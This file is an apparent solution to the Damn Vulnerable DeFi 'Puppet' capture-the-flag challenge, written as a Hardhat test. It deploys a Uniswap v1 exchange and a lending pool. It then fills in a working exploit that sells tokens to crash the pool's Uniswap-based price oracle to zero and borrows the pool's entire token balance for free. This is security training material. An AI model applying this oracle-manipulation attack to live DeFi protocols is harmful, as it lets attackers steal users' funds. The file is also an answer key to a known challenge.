import { ethers } from "hardhat";
import { expect } from "chai";
import { BigNumber } from "ethers";
import { contract, accounts as ozAccounts, accounts } from "@openzeppelin/test-environment";


// Hacky way to easily get the Uniswap v1 contracts as artifacts
// These were taken straight from https://github.com/Uniswap/uniswap-v1/tree/c10c08d81d6114f694baa8bd32f555a40f6264da/abi 
contract.artifactsDir = 'build-uniswap-v1';
const UniswapExchange = contract.fromArtifact('UniswapV1Exchange');
const UniswapFactory = contract.fromArtifact('UniswapV1Factory');

// Now get the rest of the contracts from the usual directory
contract.artifactsDir = 'artifacts/contracts/DamnValuableToken.sol';
const DamnValuableToken = contract.fromArtifact('DamnValuableToken');
contract.artifactsDir = 'artifacts/contracts/puppet/PuppetPool.sol';
const PuppetPool = contract.fromArtifact('PuppetPool');


// Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
function calculateTokenToEthInputPrice(
    tokensSold: BigNumber,
    tokensInReserve: BigNumber,
    etherInReserve: BigNumber): BigNumber {

    return tokensSold.mul(BigNumber.from(997)).mul(etherInReserve).div(
        (tokensInReserve.mul(BigNumber.from(1000)).add(tokensSold.mul(BigNumber.from(997))))
    );
}

describe('[Challenge] Puppet', function () {
    this.timeout(0);
    
    const [deployer, attacker] = ozAccounts;

    // Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('10');
    const UNISWAP_INITIAL_ETH_RESERVE = ethers.utils.parseEther('10');
    const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('10000');
    const ATTACKER_INITAL_TOKEN_BALANCE = ethers.utils.parseEther('100');


    before(async function () {
        /** SETUP SCENARIO */
        const providerAcc = (await ethers.getSigners())[5];
        
        // Deploy token to be traded in Uniswap
        this.token = await DamnValuableToken.new({ from: deployer });

        // Deploy a exchange that will be used as the factory template
        this.exchangeTemplate = await UniswapExchange.new({from: deployer});

        // Deploy factory, initializing it with the address of the template exchange
        this.uniswapFactory = await UniswapFactory.new({ from: deployer });
        await this.uniswapFactory.initializeFactory(this.exchangeTemplate.address, {from: deployer});

        // Create a new exchange for the token, and retrieve the deployed exchange's address
        const { logs } = await this.uniswapFactory.createExchange(this.token.address, { from: deployer });
        this.uniswapExchange = await UniswapExchange.at(logs[0].args.exchange);

        // Deploy the lending pool
        this.lendingPool = await PuppetPool.new(
            this.token.address,
            this.uniswapExchange.address,
            { from: deployer }
        );
    
        // Add initial token and ETH liquidity to the pool
        await this.token.approve(
            this.uniswapExchange.address,
            UNISWAP_INITIAL_TOKEN_RESERVE,
            { from: deployer }
        );
        const deadline = (await providerAcc.provider!.getBlock('latest')).timestamp * 2;
        await this.uniswapExchange.addLiquidity(
            0, // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE,
            deadline,
            { from: deployer, value: UNISWAP_INITIAL_ETH_RESERVE }
        );

        let tokenInputPrice = calculateTokenToEthInputPrice(
                ethers.utils.parseEther('1'),
                UNISWAP_INITIAL_TOKEN_RESERVE,
                UNISWAP_INITIAL_ETH_RESERVE
                );

        // Ensure Uniswap exchange is working as expected
        let fetchedPrize = await this.uniswapExchange.getTokenToEthInputPrice(ethers.utils.parseEther('1'));

        expect(
            BigNumber.from(fetchedPrize.toString()) 
        ).to.be.eq(tokenInputPrice);

        // Setup initial token balances of pool and attacker account
        await this.token.transfer(attacker, ATTACKER_INITAL_TOKEN_BALANCE, { from: deployer });
        await this.token.transfer(this.lendingPool.address, POOL_INITIAL_TOKEN_BALANCE, { from: deployer });

        // Rate should be 1:1
        expect(
            (await this.lendingPool.computeOraclePrice()).toString()
        ).to.be.eq('1');


        // Track attacker's initial ETH balance (to ensure it doesn't decrease)
        this.intialAttackerEthBalance = await providerAcc.provider!.getBalance(attacker); 

    });

    it('Exploit', async function () {
        /** YOUR EXPLOIT GOES HERE */
        const providerAcc = (await ethers.getSigners())[5];

        /*
         * computeOraclePrice = uniswap.eth / uniswap.dvt
         */

        let dvtPrice = await this.lendingPool.computeOraclePrice();
        console.log("DVT price: " + dvtPrice.toString());

        // swap DVT's for ETH to decrease DVT price
        let tx = await this.token.approve(
            this.uniswapExchange.address,
            ATTACKER_INITAL_TOKEN_BALANCE,
            { from: attacker }
        );
        console.log(tx);

        let deadline = (await providerAcc.provider!.getBlock('latest')).timestamp * 2;
        tx = await this.uniswapExchange.tokenToEthSwapInput(
            ATTACKER_INITAL_TOKEN_BALANCE,
            1,
            deadline,
            { from: attacker }
        );
        console.log(tx);

        // DVT price should be 0
        dvtPrice = await this.lendingPool.computeOraclePrice();
        console.log("DVT price: " + dvtPrice.toString());
        expect(dvtPrice.toString()).to.eq('0');

        // borrow DVTs for free
        tx = await this.lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE, { from: attacker });
        console.log(tx);
    });

    after(async function () {
        /** SUCCESS CONDITION */
        const providerAcc = (await ethers.getSigners())[5];

        // Attacker has stolen all tokens from the pool
        expect(
            BigNumber.from((await this.token.balanceOf(attacker)).toString())
        ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE);

        expect(
            BigNumber.from((await this.token.balanceOf(this.lendingPool.address)).toString())
        ).to.be.eq(0);

        // Attacker ETH balance has not decreased
        expect(
            BigNumber.from((await providerAcc.provider!.getBalance(attacker)).toString())
        ).to.be.gte(this.intialAttackerEthBalance);
    });
});
